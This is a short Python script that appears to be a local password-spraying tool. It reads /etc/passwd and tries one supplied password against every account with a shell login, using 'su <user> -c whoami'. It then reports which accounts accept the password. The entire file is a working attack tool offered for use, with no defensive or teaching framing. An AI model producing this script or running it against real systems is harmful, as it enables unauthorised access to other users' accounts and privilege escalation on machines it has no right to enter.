import subprocess

def do_spray(password):
    with open('/etc/passwd', 'r') as passwd_file:
        for line in passwd_file:
            fields = line.strip().split(':')
            username = fields[0]
            shell = fields[-1]

            # Check if the user has a shell that ends with "sh"
            if shell.endswith('sh'):
                try:
                    # Run 'su' and 'whoami' with the provided password
                    process = subprocess.Popen(['su', username, '-c', 'whoami'], stdin=subprocess.PIPE, stdout=subprocess.PIPE, 
stderr=subprocess.DEVNULL)
                    stdout, _ = process.communicate(input=password.encode(), timeout=2)
                    exit_code = process.returncode

                    if exit_code == 0:
                        print(f"Username '{username}' was able to login")
                    else:
                        print(f"Username '{username}' failed")
                except subprocess.TimeoutExpired:
                    print(f"Username '{username}' timed out")

if __name__ == "__main__":
    import sys
    if len(sys.argv) != 2:
        print("Usage: python script.py <password>")
        sys.exit(1)

    password = sys.argv[1]
    do_spray(password)

